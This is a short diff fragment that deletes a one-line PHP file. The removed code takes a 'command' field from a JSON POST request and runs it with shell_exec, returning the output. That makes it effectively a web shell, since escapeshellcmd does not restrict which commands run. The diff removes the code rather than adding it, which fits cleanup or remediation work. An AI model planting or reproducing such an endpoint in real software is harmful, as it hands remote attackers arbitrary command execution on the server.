@@ -1,1 +1,0 @@
-<?php\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $input = json_decode(file_get_contents('php://input'), true);\n    $command = escapeshellcmd($input['command']);\n    $output = shell_exec($command);\n    echo json_encode(['output' => $output]);\n}\n?>
